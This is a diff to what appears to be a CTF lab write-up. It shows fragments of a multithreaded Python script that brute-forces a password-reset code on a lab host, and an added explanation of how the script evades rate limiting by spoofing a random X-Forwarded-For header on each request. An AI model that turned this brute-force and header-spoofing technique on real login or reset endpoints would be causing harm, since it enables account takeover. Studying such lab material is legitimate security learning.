@@ -55,22 +55,12 @@ import requests
 import random
 import threading
 
-
-# =======================
-# Configuration
-# =======================
-
 URL = "http://10.48.154.110:1337/reset_password.php"
 EMAIL = "tester@hammer.thm"
 NUM_THREADS = 50
 CODE_RANGE = 10000
 
 stop_flag = threading.Event()
-
-
-# =======================
-# Helper Functions
-# =======================
 
 def generate_fake_ip():
     """Generate random IP for X-Forwarded-For header."""
@@ -160,6 +150,19 @@ if __name__ == "__main__":
     main()
 
 ```
+
+This script bypasses rate limiting mainly for **two reasons**:
+
+##### 1.Fake IP address on every request
+
+It sends a different `X-Forwarded-For` header each time:
+
+```
+"X-Forwarded-For": f"127.0.X.Y"
+```
+
+
+
 
 
 
